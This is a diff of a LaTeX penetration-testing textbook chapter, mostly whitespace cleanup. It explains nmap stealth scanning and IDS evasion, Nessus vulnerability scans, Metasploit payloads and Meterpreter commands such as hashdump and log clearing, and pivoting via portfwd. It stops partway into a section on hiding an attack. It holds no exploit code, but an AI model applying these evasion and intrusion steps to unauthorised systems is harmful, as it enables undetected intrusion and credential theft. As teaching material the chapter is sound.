@@ -1,360 +1,362 @@
 \chapter{Network Penetration}
 	\label{ch:NetworkPenetration}
-	Network penetration is a multi phase process, starting at information gathering with tools such as nmap and Nessus, and moving on to gaining and maintaining a presence through exploitation. 
-	This chapter will show a step by step progression through this, explaining how an attacker would find their target on a network, exploit it and move on to another target without losing control of the first machine. 
+	Network penetration is a multi phase process, starting at information gathering with tools such as nmap and Nessus, and moving on to gaining and maintaining a presence through exploitation.
+	This chapter will show a step by step progression through this, explaining how an attacker would find their target on a network, exploit it and move on to another target without losing control of the first machine.
 	\section{Nmap}
 	\index{Nmap}
-		Port scanning is a simple way to determine what services are running on a computer. 
-		This can be done due to the fact that most programs run on a known port specified in their documentation. 
-		However, it also works by fingerprinting the response, which is usually specific to the program which is running on the port. 
-		This can be done through a number of means, such as attempting to open a full TCP connection to each port or only attempting a partial connection. 
-		It must be noted that while effective, the former is rarely used due to the ease of detection and large amount of network traffic generated. 
-		Nmap\cite{NmapBook} is the tool that we will utilize to conduct these scans. 
-		It has a number of options which allow us to control the scan to our exact specifications and commonly picks up most services.\cite{HackingAOE} 
+		Port scanning is a simple way to determine what services are running on a computer.
+		This can be done due to the fact that most programs run on a known port specified in their documentation.
+		However, it also works by fingerprinting the response, which is usually specific to the program which is running on the port.
+		This can be done through a number of means, such as attempting to open a full TCP connection to each port or only attempting a partial connection.
+		It must be noted that while effective, the former is rarely used due to the ease of detection and large amount of network traffic generated.
+		Nmap\cite{NmapBook} is the tool that we will utilize to conduct these scans.
+		It has a number of options which allow us to control the scan to our exact specifications and commonly picks up most services.\cite{HackingAOE}
 		\subsection{SYN Scanning}
 		\index{SYN Scan}
-			The most common scan used is known as a SYN scan. 
-			This will send TCP SYN packets to the specified ports on the target computer, listening for the SYN/ACK response. 
-			If a SYN/ACK packet is received, the port is marked as open, the packet is examined for service fingerprinting and an RST packet is sent to stop the connection and prevent accidental DoS. 
-			Using nmap, the ``-sS'' flag is used to run a SYN scan. 
+			The most common scan used is known as a SYN scan.
+			This will send TCP SYN packets to the specified ports on the target computer, listening for the SYN/ACK response.
+			If a SYN/ACK packet is received, the port is marked as open, the packet is examined for service fingerprinting and an RST packet is sent to stop the connection and prevent accidental DoS.
+			Using nmap, the ``-sS'' flag is used to run a SYN scan.
 			\begin{lstlisting}[style=CLI]
 				$ nmap -sS <Target IP>
-			\end{lstlisting} 
-			This will output all of the services which are found to be running on the remote system. 
-			A sample output of an nmap SYN scan can be seen below. 
-			Note that this is an exaggerated response, as the target scanned was intentionally vulnerable. 
+			\end{lstlisting}
+			This will output all of the services which are found to be running on the remote system.
+			A sample output of an nmap SYN scan can be seen below.
+			Note that this is an exaggerated response, as the target scanned was intentionally vulnerable.
 			\lstinputlisting[language=nmap]{./shellOut/nmapSYN.out}
-			
+
 		\subsection{Other Scan Types}
-			While SYN scanning is useful, it has become easier to detect due to the introduction of IPS with partial connection rules. 
-			These systems will see a number of partial connections within a given time and will lock out the address that the connections came from, effectively halting your scan. 
-			To combat this, a number of other scan types have been created, each exploiting some part of the network standard. 
-			These newer scans work by sending a TCP packet which doesn't make sense to each port. 
-			When these packets are received by a service, they will be ignored. 
-			However, when the OS receives them on a closed port, it will often reply with a RST packet. 
-			This difference can be used to determine which ports are open. 
-			This will work on any system which follows the RFC793 standard. 
-			Most *nix systems following this, however, windows does not. 
+			While SYN scanning is useful, it has become easier to detect due to the introduction of IPS with partial connection rules.
+			These systems will see a number of partial connections within a given time and will lock out the address that the connections came from, effectively halting your scan.
+			To combat this, a number of other scan types have been created, each exploiting some part of the network standard.
+			These newer scans work by sending a TCP packet which doesn't make sense to each port.
+			When these packets are received by a service, they will be ignored.
+			However, when the OS receives them on a closed port, it will often reply with a RST packet.
+			This difference can be used to determine which ports are open.
+			This will work on any system which follows the RFC793 standard.
+			Most *nix systems following this, however, windows does not.
 			\index{Fin Scan}
 			\index{Xmas Scan}
 			\index{Null Scan}
 			\begin{description}
 				\item[FIN scan]
-					sends a FIN packet. 
-					Used by specifying ``-sF'' in nmap. 
+					sends a FIN packet.
+					Used by specifying ``-sF'' in nmap.
 				\item[Xmas scan]
 					sends a packet with FIN, URG and PUSH flags on.
-					Used by specifying ``-sX'' in nmap. 
+					Used by specifying ``-sX'' in nmap.
 				\item[null scan]
-					sends a packet with all flags off. 
-					Used by specifying ``-sN'' in nmap. 
+					sends a packet with all flags off.
+					Used by specifying ``-sN'' in nmap.
 			\end{description}
-			These scans will generally give you exactly the same output as the SYN scan, except where RST replies are not sent or where SYN scans are blocked by a firewall. 
-			When you don't care about hiding and would like as much information as possible, all nmap scans can be integrated by using the ``-A'' option. 
-			This will turn on all scanners, taking significantly more time and producing significantly network noise, however, you will receive detailed information on the services and OS running on the target. 
+			These scans will generally give you exactly the same output as the SYN scan, except where RST replies are not sent or where SYN scans are blocked by a firewall.
+			When you don't care about hiding and would like as much information as possible, all nmap scans can be integrated by using the ``-A'' option.
+			This will turn on all scanners, taking significantly more time and producing significantly network noise, however, you will receive detailed information on the services and OS running on the target.
 
 		\subsection{Other Means of Hiding}
-			By default, many of these scans can be both loud and obvious to the trained eye or IDS.\footnote{\url{https://nmap.org/bennieston-tutorial/}} 
-			Thus, nmap also comes with a set of flags which will enable you to attempt to hide the most obvious parts of the scan. 
-			These, when used well will allow you to run an scan which will not be noticed by most of the IDS which are on the market today. 
+			By default, many of these scans can be both loud and obvious to the trained eye or IDS.\footnote{\url{https://nmap.org/bennieston-tutorial/}}
+			Thus, nmap also comes with a set of flags which will enable you to attempt to hide the most obvious parts of the scan.
+			These, when used well will allow you to run an scan which will not be noticed by most of the IDS which are on the market today.
 
-			By default, nmap adjusts its timings based on network speed and the response times of the target. 
-			However, you are able to adjust these timings in order to either avoid detection or have the scan complete as quickly as possible. 
+			By default, nmap adjusts its timings based on network speed and the response times of the target.
+			However, you are able to adjust these timings in order to either avoid detection or have the scan complete as quickly as possible.
 			\index{Nmap Timings}
-			These start with the ``-T0'' or paranoid scan, which will send packets at 5 minute intervals. 
-			This timing will likely not be picked up by an IDS, nor by after the fact analysis due to the fact that random Internet traffic usually presents this number of invalid packets. 
-			On the other end of the spectrum is the ``-T5''  or insane scan. 
-			This scan will map a network exceptionally fast, but will trip most IDS systems and will be obvious in logs. 
-			Furthermore, if you are on a slower network connection, it is possible that this scan will fail or drop data due to the high data rate required. 
-			Further adjustment to specific parts of timings can be made, but this is usually not necessary. 
-			See the nmap manual for more information on these. 
+			These start with the ``-T0'' or paranoid scan, which will send packets at 5 minute intervals.
+			This timing will likely not be picked up by an IDS, nor by after the fact analysis due to the fact that random Internet traffic usually presents this number of invalid packets.
+			On the other end of the spectrum is the ``-T5''  or insane scan.
+			This scan will map a network exceptionally fast, but will trip most IDS systems and will be obvious in logs.
+			Furthermore, if you are on a slower network connection, it is possible that this scan will fail or drop data due to the high data rate required.
+			Further adjustment to specific parts of timings can be made, but this is usually not necessary.
+			See the nmap manual for more information on these.
 
 			\index{Nmap Decoy}
 			If you are attempting to hide that you are the attacker, the decoy option ``-D'' will allow you to specify a number of IP addresses from which it will seem the attack originates.
-			While this will not hide your own address, it will place it within a swath of other information, making it difficult to determine the original attacker. 
-			Furthermore, when looking at logs, the target will assume that they were being scanned by a large number of hosts, causing them to worry about the potential future attacks. 
+			While this will not hide your own address, it will place it within a swath of other information, making it difficult to determine the original attacker.
+			Furthermore, when looking at logs, the target will assume that they were being scanned by a large number of hosts, causing them to worry about the potential future attacks.
 
 			For another level of stealth, ICMP pings can be turned off.
-			These will make the scan less likely to be picked up in as the machines being scanned will not have a ping going out to test whether they are up first. 
-			Furthermore, it will allow nmap to scan all hosts, rather than just those responding to ping. 
-			When using this flag, you can also specify flags such as ``-PT'' or ``-PS'' which will send a TCP or SYN ping respectively. 
-			There are a number of options for ping within nmap scans. See the ``-Px'' flags within the nmap manual. 
+			These will make the scan less likely to be picked up in as the machines being scanned will not have a ping going out to test whether they are up first.
+			Furthermore, it will allow nmap to scan all hosts, rather than just those responding to ping.
+			When using this flag, you can also specify flags such as ``-PT'' or ``-PS'' which will send a TCP or SYN ping respectively.
+			There are a number of options for ping within nmap scans. See the ``-Px'' flags within the nmap manual.
 
 			\index{Frammented Nmap Scan}
-			A final option for bypassing firewalls is to use the fragment or ``-f'' option. 
-			This will split every packet sent to the target into a number of small packets, which many firewalls will not attempt to reassemble before scanning them. 
-			While this means that you are more likely to get past the firewall, it also can crash some less stable software and hardware. 
-			Thus, this should be used with care, as crashing computer systems are exceptionally noisy. 
+			A final option for bypassing firewalls is to use the fragment or ``-f'' option.
+			This will split every packet sent to the target into a number of small packets, which many firewalls will not attempt to reassemble before scanning them.
+			While this means that you are more likely to get past the firewall, it also can crash some less stable software and hardware.
+			Thus, this should be used with care, as crashing computer systems are exceptionally noisy.
 	\section{Nessus}
 	\index{Nessus}
 	%http://www.securitylearn.net/tag/nessus-tutorial/
-		Nessus is an exceptionally powerful vulnerability scanner. 
-		It works by first conducting a port scan on the target computer, than attempting to fingerprint all open ports. 
-		This allows Nessus to provide a detailed output of the likely vulnerabilities that exist on the system as well as the CVEs that relate to them. 
-		It is this knowledge base and the detail that can be found within it that has made Nessus as popular as it currently is. 
-		
+		Nessus is an exceptionally powerful vulnerability scanner.
+		It works by first conducting a port scan on the target computer, than attempting to fingerprint all open ports.
+		This allows Nessus to provide a detailed output of the likely vulnerabilities that exist on the system as well as the CVEs that relate to them.
+		It is this knowledge base and the detail that can be found within it that has made Nessus as popular as it currently is.
+
 		\subsection{Installing and Running Nessus}
 			Download the \href{http://www.tenable.com/products/nessus-vulnerability-scanner}{Nessus installer}
-			from Tenable and run it. 
-			At this point you can start Nessus. On Kali, this is done by running the command ``/etc/init.d/nessusd start''. 
-			Then in your browser, open the web page ``https:localhost:8834''. 
-			This will give you the start page for Nessus. 
-			Following the steps outlined on the screen will get you to a usable Nessus install. 
+			from Tenable and run it.
+			At this point you can start Nessus. On Kali, this is done by running the command ``/etc/init.d/nessusd start''.
+			Then in your browser, open the web page ``https:localhost:8834''.
+			This will give you the start page for Nessus.
+			Following the steps outlined on the screen will get you to a usable Nessus install.
 
 		\subsection{Running a Scan}
-			Nessus comes with a number of pre-built scan types which work for different types of systems. 
+			Nessus comes with a number of pre-built scan types which work for different types of systems.
 			These are described below:
 			\begin{description}
-				\item[External Network Scan] This scan is written for externally facing hosts. 
-					It will scan all ports on the host, as well as having a number of plugins configured for scanning for items such as XSS. 
+				\item[External Network Scan] This scan is written for externally facing hosts.
+					It will scan all ports on the host, as well as having a number of plugins configured for scanning for items such as XSS.
 				\item[Internal Network Scan]
-					Configured for large internal networks, this scan will scan all standard ports expecting workstation, server and embedded machines. 
+					Configured for large internal networks, this scan will scan all standard ports expecting workstation, server and embedded machines.
 				\item[Web Application Tests]
-					This scan is designed to detect common vulnerabilities in Web Applications. 
-					It will spider the site and discover both the content and the links within the application. 
-					Once this spider is complete, Nessus will attempt to determine the vulnerabilities which exist within the pages found. 
+					This scan is designed to detect common vulnerabilities in Web Applications.
+					It will spider the site and discover both the content and the links within the application.
+					Once this spider is complete, Nessus will attempt to determine the vulnerabilities which exist within the pages found.
 				\item[PCI DSS Audit]
-					This scan is built to determine whether a system is vulnerable to a security risk which is explicitly stated within the Payment Card Industry Data Security Standards. 
-					While it does not guarantee not to find false reports, it will pick up a number of the basic vulnerabilities which must be fixed before a PCI DSS Audit. 
+					This scan is built to determine whether a system is vulnerable to a security risk which is explicitly stated within the Payment Card Industry Data Security Standards.
+					While it does not guarantee not to find false reports, it will pick up a number of the basic vulnerabilities which must be fixed before a PCI DSS Audit.
 			\end{description}
-			At this point, you can select the new scan button and select the scan which will work best for your goals. 
-			You will be directed to the new scan page, which will allow you to detail the targets which you are pointing the scan at. 
-			The common subneting notations work within this box, allowing you to specify a range of IP addresses. 
+			At this point, you can select the new scan button and select the scan which will work best for your goals.
+			You will be directed to the new scan page, which will allow you to detail the targets which you are pointing the scan at.
+			The common subneting notations work within this box, allowing you to specify a range of IP addresses.
 
-			Once you have selected your target, you can customize the scan using the other tabs down the left of the page. 
-			This will allow you to alter default settings such as the ports which will be scanned and the verbosity of the report which will be generated. 
+			Once you have selected your target, you can customize the scan using the other tabs down the left of the page.
+			This will allow you to alter default settings such as the ports which will be scanned and the verbosity of the report which will be generated.
 		\subsection{The Report}
-			Once the scan has completed, you will be able to see the results under the completed scans tab. 
-			This page will give you a breakdown based on the severity of the possible vulnerability of what could be targeted on the scanned machine. 
-			Selecting an individual vulnerability will give detail about both the method used to scan it, and possible methods used to exploit it. 
-			Some vulnerabilities will also come with links to the CVE that was given to its report and a set of possible mitigations. 
+			Once the scan has completed, you will be able to see the results under the completed scans tab.
+			This page will give you a breakdown based on the severity of the possible vulnerability of what could be targeted on the scanned machine.
+			Selecting an individual vulnerability will give detail about both the method used to scan it, and possible methods used to exploit it.
+			Some vulnerabilities will also come with links to the CVE that was given to its report and a set of possible mitigations.
 
-			It is worth noting that the existence of a vulnerability report here does not mean that the vulnerability exists on the target system. 
-			Rather it is only an indication that something that fingerprints similarly to the expected vulnerability exists. 
-			Thus, a vulnerability found within this report cannot be regarded as an actual entry point, further testing and an actual penetration is required. 
+			It is worth noting that the existence of a vulnerability report here does not mean that the vulnerability exists on the target system.
+			Rather it is only an indication that something that fingerprints similarly to the expected vulnerability exists.
+			Thus, a vulnerability found within this report cannot be regarded as an actual entry point, further testing and an actual penetration is required.
 	\section{Metasploit}
 	\index{Metasploit}
-		Metasploit is a framework for creating and launching attacks on other machines.\footnote{\url{https://www.offensive-security.com/metasploit-unleashed/}} 
-		It was initially created due to the lack of modularisation in attacks in the early 2000's. 
-		It has since allowed for those crafting attacks to focus on exploiting the software, allowing a multitude of payload and connection options to be incorporated into the exploit. 
-		Due to this, Metasploit was created with a step by step usage. 
-		This will be explained in the following section. 
+		Metasploit is a framework for creating and launching attacks on other machines.\footnote{\url{https://www.offensive-security.com/metasploit-unleashed/}}
+		It was initially created due to the lack of modularisation in attacks in the early 2000's.
+		It has since allowed for those crafting attacks to focus on exploiting the software, allowing a multitude of payload and connection options to be incorporated into the exploit.
+		Due to this, Metasploit was created with a step by step usage.
+		This will be explained in the following section.
 
-		Before following any of these steps, you will have to have used Nmap and Nessus to gather a list of possible vulnerabilities. 
-		Using these, you can determine which exploit modules may be useful. 
-		However, without it, you will simply be producing noise on the target network. 
-		Thus, before even touching Metasploit, you must know the target system well and have a plan of what you will attempt to exploit on it. 
-		
+		Before following any of these steps, you will have to have used Nmap and Nessus to gather a list of possible vulnerabilities.
+		Using these, you can determine which exploit modules may be useful.
+		However, without it, you will simply be producing noise on the target network.
+		Thus, before even touching Metasploit, you must know the target system well and have a plan of what you will attempt to exploit on it.
+
 		\subsection{MSFconsole}
 		\index{MSFconsole}
-			MSFconsole is the tool that you will interact with when using Metasploit. 
-			This is the command line which you can interactively craft your attack. 
-			However, it will also allow you to manage a number of attacks and target machines. 
+			MSFconsole is the tool that you will interact with when using Metasploit.
+			This is the command line which you can interactively craft your attack.
+			However, it will also allow you to manage a number of attacks and target machines.
 
-			MSFconsole has a number of commands which can be used. 
+			MSFconsole has a number of commands which can be used.
 			The following is a list of the most useful commands:
 			\begin{description}
-				\item[cd] Change working directory. 
-					Exactly the same as the Unix command. 
-				\item[connect] Communicate with a host. 
-					This is similar to using netcat. 
-				\item[edit] Edit the current module with the current \$EDITOR. 
-				\item[exit] End the MSFconsole session. 
-				\item[get] Get the value of a variable within this context. 
-				\item[grep] Search the output of another command. 
-					Exactly the same as the Unix command. 
-				\item[help] Shows the explanations for most commands. 
-				\item[info] Shows information about one or more modules. 
-				\item[irb] Allows in place ruby scripting. 
+				\item[cd] Change working directory.
+					Exactly the same as the Unix command.
+				\item[connect] Communicate with a host.
+					This is similar to using netcat.
+				\item[edit] Edit the current module with the current \$EDITOR.
+				\item[exit] End the MSFconsole session.
+				\item[get] Get the value of a variable within this context.
+				\item[grep] Search the output of another command.
+					Exactly the same as the Unix command.
+				\item[help] Shows the explanations for most commands.
+				\item[info] Shows information about one or more modules.
+				\item[irb] Allows in place ruby scripting.
 				\item[jobs] Shows and allows management of running jobs.
 				\item[kill] Kills a running job.
-				\item[load] Load a given plugin. 
-					Arguments are passed as ``key=value''. 
-				\item[makerc] Save the commands you have entered thus far into a script. 
-				\item[resource] Runs the commands saved in a file. 
-					This file is usually created with the above ``makerc'' command. 
-				\item[route] Route traffic through a session. 
-				\item[save] Saves the active datastore. 
-					This should allow you to return to the current session later. 
-				\item[search] Search for a module with the given name or description. 
-				\item[sessions] Show the current session listing and an information page on them. 
-				\item[set] Sets a variable for the current exploit or payload. 
-				\item[setg] Sets a global variable. 
-				\item[show] Show modules of a given type or all. 
-					A common usage is ``show options'' when setting up an attack. 
-				\item[spool] Like a redirect in bash, but writes output to both a file and the screen. 
-				\item[unset] Deletes the contents of a variable. 
-				\item[use] Selects a module to use by name. 
+				\item[load] Load a given plugin.
+					Arguments are passed as ``key=value''.
+				\item[makerc] Save the commands you have entered thus far into a script.
+				\item[resource] Runs the commands saved in a file.
+					This file is usually created with the above ``makerc'' command.
+				\item[route] Route traffic through a session.
+				\item[save] Saves the active datastore.
+					This should allow you to return to the current session later.
+				\item[search] Search for a module with the given name or description.
+				\item[sessions] Show the current session listing and an information page on them.
+				\item[set] Sets a variable for the current exploit or payload.
+				\item[setg] Sets a global variable.
+				\item[show] Show modules of a given type or all.
+					A common usage is ``show options'' when setting up an attack.
+				\item[spool] Like a redirect in bash, but writes output to both a file and the screen.
+				\item[unset] Deletes the contents of a variable.
+				\item[use] Selects a module to use by name.
 			\end{description}
 			\subsection{Exploits}
 			\index{Exploits}
-				Exploits are chosen based on the output of the Nmap and Nessus. 
-				You should choose the exploit which suits the vulnerability which you found within these scans. 
-				Not doing so will cause a large amount of excess network traffic and likely get you found. 
+				Exploits are chosen based on the output of the Nmap and Nessus.
+				You should choose the exploit which suits the vulnerability which you found within these scans.
+				Not doing so will cause a large amount of excess network traffic and likely get you found.
 
-				The commands above will allow you to search the list of exploits, and use them. 
-				However, it should be noted that the exploit that you choose will give you a number of new options. 
-				The commands below will give you more information or tell you whether the exploit is likely to work. 
+				The commands above will allow you to search the list of exploits, and use them.
+				However, it should be noted that the exploit that you choose will give you a number of new options.
+				The commands below will give you more information or tell you whether the exploit is likely to work.
 				\begin{description}
 					\item[check]
-						Determine Whether a target is vulnerable. 
-					\item[exploit] Launch the attack. 
+						Determine Whether a target is vulnerable.
+					\item[exploit] Launch the attack.
 					\item[show targets] Shows the targets which will be vulnerable to this attack.
-					\item[show payloads] Shows the payloads which are compatible with this exploit. 
-					\item[show options] Shows the options which must be set to execute this exploit. 
-					\item[show advanced] Shows the advanced options for the exploit. 
-						These will likely not be useful unless you have very specific requirements. 
+					\item[show payloads] Shows the payloads which are compatible with this exploit.
+					\item[show options] Shows the options which must be set to execute this exploit.
+					\item[show advanced] Shows the advanced options for the exploit.
+						These will likely not be useful unless you have very specific requirements.
 					\item[show evasion] Shows options used to attempt to avoid detection.
 				\end{description}
 			\subsection{Payloads}
 			\index{Payloads}
-				The payload is the code which is sent to be executed on the remote machine. 
+				The payload is the code which is sent to be executed on the remote machine.
 				It is designed to get you a foothold, or perform a specific task on the machine.
-				This code is usually quite small so as to aid transmission to the target. 
-				This is usually either shellcode, or the program that you have sent for the shellcode to execute. 
+				This code is usually quite small so as to aid transmission to the target.
+				This is usually either shellcode, or the program that you have sent for the shellcode to execute.
 
 				Payloads come in a number of types:
 				\begin{description}
 					\item[Inline]
-						This is a single payload containing both the exploit and the shellcode for a task. 
-						These are more stable, but far larger than other types of payload due to the fact that they must contain everything in the initial payload. 
+						This is a single payload containing both the exploit and the shellcode for a task.
+						These are more stable, but far larger than other types of payload due to the fact that they must contain everything in the initial payload.
 					\item[Staged]
-						This is a multi phase payload which works with a stager which receives the rest of the payload as it is needed. 
-						This allows for smaller initial exploits, but requires a constant connection between the attacker and target. 
-						This means that while it is easier to fit into an exploit, it can be far less reliable. 
+						This is a multi phase payload which works with a stager which receives the rest of the payload as it is needed.
+						This allows for smaller initial exploits, but requires a constant connection between the attacker and target.
+						This means that while it is easier to fit into an exploit, it can be far less reliable.
 					\item[Meterpreter]
-						This is a meta-interpreter which allows for high level interaction with the OS. 
-						It resides completely in memory, and has a number of scripts and plugins which can be used to better attack the target. 
+						This is a meta-interpreter which allows for high level interaction with the OS.
+						It resides completely in memory, and has a number of scripts and plugins which can be used to better attack the target.
 					\item[PassiveX]
-						This is useful for circumventing restrictive out bound firewalls. 
-						It is based on ActiveX, creating a hidden IE instance and communicating over HTTP. 
+						This is useful for circumventing restrictive out bound firewalls.
+						It is based on ActiveX, creating a hidden IE instance and communicating over HTTP.
 					\item[NoNX]
-						These are payloads designed to prevent NX bit implementations from stopping the payload. 
-						For example, this would work to prevent DEP from stopping a payload on Windows. 
+						These are payloads designed to prevent NX bit implementations from stopping the payload.
+						For example, this would work to prevent DEP from stopping a payload on Windows.
 					\item[IPv6]
-						These are payloads which may fit into another category but are designed to work over IPv6. 
+						These are payloads which may fit into another category but are designed to work over IPv6.
 					\item[Reflective DLL Injection]
-						This is a technique where a staged payload is injected into the compromised host in memory. 
+						This is a technique where a staged payload is injected into the compromised host in memory.
 						It is designed to be difficult to detect by ensuring that it doesn't touch the filesystem.\footnote{\url{http://blog.harmonysecurity.com/2008/10/new-paper-reflective-dll-injection.html}}
 				\end{description}
-				
-				When using a payload, it may be necessary to manipulate it for the target system. 
-				This can be done in Metasploit with the ``generate'' command. 
-				This command will create a hex encoded string which contains the shellcode ready to be input into an exploit. 
-				However, this string will likely either contain bad characters or not be the correct encoding. 
-				Thus, the generate command comes with a number of flags which allow you to set these values. 
-				For example, the ``-b'' flag will tell the command to attempt to remove all characters which come after it. 
-				Another example of this is the ``-e'' flag, which alongside the ``show encoders'' command will allow you to set the encoder which will be used to write the payload. 
-				Finally, the ``-f'' flag can be used to give a file to write the payload to. 
-		
+
+				When using a payload, it may be necessary to manipulate it for the target system.
+				This can be done in Metasploit with the ``generate'' command.
+				This command will create a hex encoded string which contains the shellcode ready to be input into an exploit.
+				However, this string will likely either contain bad characters or not be the correct encoding.
+				Thus, the generate command comes with a number of flags which allow you to set these values.
+				For example, the ``-b'' flag will tell the command to attempt to remove all characters which come after it.
+				Another example of this is the ``-e'' flag, which alongside the ``show encoders'' command will allow you to set the encoder which will be used to write the payload.
+				Finally, the ``-f'' flag can be used to give a file to write the payload to.
+
 			\subsection{Databases}
 			\index{Metasploit Database}
-				Metasploit is also backed with a Postgresql database. 
-				This database stores the information that you derive from your scans and attacks, allowing you to pull it back up in a timely manner. 
-				Furthermore, the database is split into workspaces, which can be managed with the ``workspace'' command. 
-				This allows one to create a store of information about a target or targets which persists over sessions. 
+				Metasploit is also backed with a Postgresql database.
+				This database stores the information that you derive from your scans and attacks, allowing you to pull it back up in a timely manner.
+				Furthermore, the database is split into workspaces, which can be managed with the ``workspace'' command.
+				This allows one to create a store of information about a target or targets which persists over sessions.
 
-				When interacting with the database, specific commands must be used. 
-				Rather than using the normal tools such as nmap, one should use the database patched ``db\_'' versions instead. 
-				These will run in the same manner, but will also store their output in the database for future reference. 
-				If the scan was done previously, or outside of the MSFconsole, one can import the XML file generated using ``db\_import''. 
+				When interacting with the database, specific commands must be used.
+				Rather than using the normal tools such as nmap, one should use the database patched ``db\_'' versions instead.
+				These will run in the same manner, but will also store their output in the database for future reference.
+				If the scan was done previously, or outside of the MSFconsole, one can import the XML file generated using ``db\_import''.
 
-				At this point, the ``hosts'' command will give an output of the hosts and their OS and network fingerprint. 
-				It can further be used with it's flags in order to pull more information out of the database. 
-				Similarly, the ``services'' command will allow you to pull available services out of the database. 
-				Finally, collected hashes and other similar information can be retrieved using the ``loot'' command. 
-	
+				At this point, the ``hosts'' command will give an output of the hosts and their OS and network fingerprint.
+				It can further be used with it's flags in order to pull more information out of the database.
+				Similarly, the ``services'' command will allow you to pull available services out of the database.
+				Finally, collected hashes and other similar information can be retrieved using the ``loot'' command.
+
 			\subsection{Meterpreter}
 			\index{Meterpreter}
-				Meterpreter provides an environment which gives you powerful access to the target computer. 
-				It will give you access to both the host itself, but also network and file transfers, allowing you to retrieve data from the computer and plant other exploits. 
+				Meterpreter provides an environment which gives you powerful access to the target computer.
+				It will give you access to both the host itself, but also network and file transfers, allowing you to retrieve data from the computer and plant other exploits.
 				While most normal Unix commands work, what follows is a list of Metrepreter specific commands:
 				\begin{description}
 					\item[background]
-						Return to the MSFconsole. 
-						You can get back to Meterpreter using the sessions command. 
+						Return to the MSFconsole.
+						You can get back to Meterpreter using the sessions command.
 					\item[clearev]
-						Clear the Application, System and Security logs of a windows system. 
-					\item[download] 
-						Takes a file from the remote machine to the attackers. 
-						Note: Use double slashes when working with windows paths. 
-					\item[edit] 
-						Open the Vim editor on the given file. 
+						Clear the Application, System and Security logs of a windows system.
+					\item[download]
+						Takes a file from the remote machine to the attackers.
+						Note: Use double slashes when working with windows paths.
+					\item[edit]
+						Open the Vim editor on the given file.
 					\item[execute]
-						Runs the given command on the target machine. 
+						Runs the given command on the target machine.
 					\item[getuid]
-						Get the user ID and name that the Meterpreter session is running as. 
+						Get the user ID and name that the Meterpreter session is running as.
 					\item[hashdump]
-						Write the contents of the SAM database to screen. 
+						Write the contents of the SAM database to screen.
 					\item[idletime]
-						Prints the time that the user of the target machine has been idle. 
+						Prints the time that the user of the target machine has been idle.
 					\item[lpwd and lcd]
-						These commands will print or change the attacking machines directory. 
+						These commands will print or change the attacking machines directory.
 					\item[migrade]
-						Move to another process on the victim machine. 
+						Move to another process on the victim machine.
 					\item[resource]
-						Execute a script written for Meterpreter found in the given file. 
+						Execute a script written for Meterpreter found in the given file.
 					\item[search]
-						Find a specific file on the target machine. 
+						Find a specific file on the target machine.
 					\item[shell]
-						Run a native shell on the target machine. 
+						Run a native shell on the target machine.
 					\item[upload]
-						The exact reverse of the download command. 
+						The exact reverse of the download command.
 					\item[webcam\_snap]
-						This, along with ``webcam\_list'' will take a photo using the webcam attached to the computer. 
+						This, along with ``webcam\_list'' will take a photo using the webcam attached to the computer.
 				\end{description}
-				It is worth noting that Meterpreter can be extended by writing a python script and executing or importing it using ``python\_execute'' or ``python\_import'' respectively. 
-			% For Basic Metasploit this is as far as we go. 
-			% We could get far further into exploit development and other advanced topics, but it is beyond the scope of this. 
+				It is worth noting that Meterpreter can be extended by writing a python script and executing or importing it using ``python\_execute'' or ``python\_import'' respectively.
+			% For Basic Metasploit this is as far as we go.
+			% We could get far further into exploit development and other advanced topics, but it is beyond the scope of this.
 	\section{Pivoting}
 	\index{Pivoting}
-		Pivoting is the act of using a machine that you have gained access to as a means to penetrate further into the network. 
-		This allows an attacker to avoid having to bypass the external firewall again while also giving access to internal DNS amongst other local networks. 
-		Thus, pivoting is a fundamental aspect of penetration testing, allowing for a vastly higher level of access than would be available without it. 
-		This section assumes that you have successfully broken into the target machine and have a Meterpreter session running on it. 
-	
+		Pivoting is the act of using a machine that you have gained access to as a means to penetrate further into the network.
+		This allows an attacker to avoid having to bypass the external firewall again while also giving access to internal DNS amongst other local networks.
+		Thus, pivoting is a fundamental aspect of penetration testing, allowing for a vastly higher level of access than would be available without it.
+		This section assumes that you have successfully broken into the target machine and have a Meterpreter session running on it.
+
 		In order to pivot, we will use the Meterpreter command ``portfwd''.
-		This command sets up a TCP forwarding rule on the machine, allowing you to interact with the local network as if you were working from the machine itself. 
+		This command sets up a TCP forwarding rule on the machine, allowing you to interact with the local network as if you were working from the machine itself.
 		The options for ``portfwd'' can be found in table \ref{tab:portfwdFlags}.
 		\begin{table}[htb]
 			\centering
 				\begin{adjustbox}{max width=1\textwidth}
-			\begin{tabular}{| l | l |}
-				\hline
-				\textbf{Flag} & \textbf{Description} \\ \hline
-				-L & The listening host. Omitted unless listening on a specific adaptor.\\ \hline
-				-l & The local port to listen on. Connections here will be forwarded. \\ \hline
-				-p & TCP port to forward connections to. \\ \hline
-				-r & The IP address the connection is relayed to. \\ \hline
-				Add & Create a forwarding rule. \\ \hline
-				Delete & Remove a forwarding rule. \\ \hline
-				List & List all forwarding ports. \\ \hline
-				Flush & Delete all rules. \\ \hline
+			\begin{tabular}{l l }
+				\toprule
+				\textbf{Flag} & \textbf{Description} \\
+				\toprule
+				-L & The listening host. Omitted unless listening on a specific adaptor.\\
+				-l & The local port to listen on. Connections here will be forwarded. \\
+				-p & TCP port to forward connections to. \\
+				-r & The IP address the connection is relayed to. \\
+				Add & Create a forwarding rule. \\
+				Delete & Remove a forwarding rule. \\
+				List & List all forwarding ports. \\
+				Flush & Delete all rules. \\
+				\bottomrule
 			\end{tabular}
 		\end{adjustbox}
 			\caption{Portfwd Flags}
 			\label{tab:portfwdFlags}
 		\end{table}
-		This should be done after scanning the internal network and choosing a target. 
-		This is due to the fact that you will have to know the port and how you will attack it well before setting up the forwarding rule. 
-		By utilizing this alongside hash captures and system access one can quickly and easily control most machines within a corporate network. 
-		This makes pivoting an exceptionally useful tool for anyone attempting to gain access into computer systems. 
+		This should be done after scanning the internal network and choosing a target.
+		This is due to the fact that you will have to know the port and how you will attack it well before setting up the forwarding rule.
+		By utilizing this alongside hash captures and system access one can quickly and easily control most machines within a corporate network.
+		This makes pivoting an exceptionally useful tool for anyone attempting to gain access into computer systems.
 
 	\section{Hiding Your Initial Attack}
-		When you are attacking a network, it is best not to attack directly from your base machine. 
-		This is because it is trivial to track the address used by an attacker and block it. 
-		However, if you have a number of machines that you can pivot through, it becomes harder. 
-		Furthermore, if those machines can have their address altered, you are able to keep up your attack indefinitely. 
+		When you are attacking a network, it is best not to attack directly from your base machine.
+		This is because it is trivial to track the address used by an attacker and block it.
+		However, if you have a number of machines that you can pivot through, it becomes harder.
